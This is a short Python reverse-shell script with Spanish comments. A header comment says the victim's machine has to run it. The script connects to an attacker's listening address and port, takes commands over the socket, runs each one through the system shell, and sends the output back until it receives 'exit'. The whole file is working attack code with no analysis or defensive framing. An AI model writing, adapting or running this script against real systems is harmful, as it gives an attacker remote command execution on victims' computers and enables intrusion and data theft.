# Este fichero tiene que ser ejecutado por la máquina víctima

import socket
import subprocess

servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
servidor.connect(("127.0.0.1", 4444)) # IP del atacante y puerto de escucha

while True:
    comando = servidor.recv(1024).decode()
    if comando.lower() == "exit":
        break
    resultado = subprocess.check_output(comando, shell=True)
    servidor.send(resultado)

servidor.close()

